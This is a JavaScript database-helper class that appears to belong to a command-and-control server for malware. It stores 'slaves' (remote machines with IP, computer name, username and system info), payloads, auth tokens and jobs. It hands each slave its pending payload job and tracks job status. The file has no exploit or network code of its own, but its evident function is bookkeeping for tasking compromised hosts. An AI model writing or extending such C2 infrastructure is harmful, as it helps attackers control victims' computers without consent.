
class DatabaseHelper {

    constructor() {
        // Init database...
        this.authTokens = [];
        this.slaves = [];
        this.payloads = [];
        this.jobs = [];

        this.addNewJob({
            id: "RANDOMJOBIDDDD",
            slaveId: "e1896e80-c325-11ed-b033-f5252f300cca",
            payloadId: "PAYLOAD_ID"
        })
    }

    addNewSlave(slave) {

        this.slaves.push({
            id: slave.id,
            ip: slave.ip,
            computername: slave.computername,
            username: slave.username,
            computerinfo: slave.computerinfo,
        });
    }

    saveAuthToken(token, user) {
        this.authTokens.push({
            user: user,
            token: token
        })
    }

    addNewJob(job) {
        this.jobs.push({
            id: job.id,
            slaveId: job.slaveId,
            payloadId: job.payloadId,
            objectSize: 15960,
            createdAt: new Date(Date.now()).toUTCString(),
            finishedAt: "",
            status: "PENDING",
        })
    }

    setJobStatus(id, status, finished = false) {
        this.jobs = this.jobs.map(job => {

            // Change the status of the job with id.
            if (job.id == id) {

                job.status = status;
                if (finished) {
                    job.finishedAt = new Date(Date.now()).toUTCString() 
                }
                
                return job;
            }

            return job; // Leave the other jobs be.
        });
    }

    getSlaveById(id) {
        return this.slaves.filter((entry => entry.id == id))[0];
    }

    getAuthTokenById(token) {
        return this.authTokens.filter((entry => token == entry.token))[0];
    }

    getJobForSlave(id) {
        return this.jobs.filter(entry => entry.slaveId == id && entry.status == "PENDING")[0];
    }

    getJobWithId(id) {
        return this.jobs.filter(entry => entry.id == id)[0]
    }
}

module.exports = DatabaseHelper;